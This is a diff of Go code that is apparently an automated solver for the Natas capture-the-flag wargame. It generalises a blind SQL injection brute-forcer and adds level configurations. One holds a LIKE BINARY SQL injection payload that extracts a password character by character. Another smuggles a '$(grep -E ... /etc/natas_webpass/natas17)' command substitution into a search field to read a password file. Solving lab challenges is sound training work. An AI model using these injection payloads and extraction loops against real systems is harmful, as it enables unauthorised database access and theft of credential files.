@@ -267,11 +267,11 @@ func (c Combine) Grab(r http.Request) string {
 	return prefix + suffix
 }
 
-type SQLBruteForce struct {
-	Field, SQLPrefix, Success string
+type BruteForce struct {
+	Field, Prefix, Suffix, First, Wildcard, Fail string
 }
 
-func (s SQLBruteForce) Grab(r http.Request) string {
+func (s BruteForce) Grab(r http.Request) string {
 	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
 	var (
 		p = Post{
@@ -283,16 +283,16 @@ func (s SQLBruteForce) Grab(r http.Request) string {
 	)
 
 	for _, c := range chars {
-		p.Data[s.Field] = Text{s.SQLPrefix + "%" + string(c) + "%"}
-		if strings.Contains(p.Grab(r), s.Success) {
+		p.Data[s.Field] = Text{s.Prefix + s.Wildcard + string(c) + s.Wildcard + s.Suffix}
+		if !strings.Contains(p.Grab(r), s.Fail) {
 			knownChars += string(c)
 		}
 	}
 Loop:
 	for {
 		for _, c := range knownChars {
-			p.Data[s.Field] = Text{s.SQLPrefix + result + string(c) + "%"}
-			if strings.Contains(p.Grab(r), s.Success) {
+			p.Data[s.Field] = Text{s.Prefix + s.First + result + string(c) + s.Wildcard + s.Suffix}
+			if !strings.Contains(p.Grab(r), s.Fail) {
 				result += string(c)
 				continue Loop
 			}
@@ -416,10 +416,23 @@ var levels = [...]Grabber{
 		},
 		nil,
 	},
-	SQLBruteForce{
+	//level 15
+	BruteForce{
 		"username",
 		"natas16\" AND password LIKE BINARY \"",
-		"This user exists.",
+		"",
+		"",
+		"%",
+		"This user doesn't exist.",
+	},
+	//level 16
+	BruteForce{
+		"needle",
+		"^$(grep -E ",
+		" /etc/natas_webpass/natas17)African",
+		"^",
+		".*",
+		"African",
 	},
 }
 
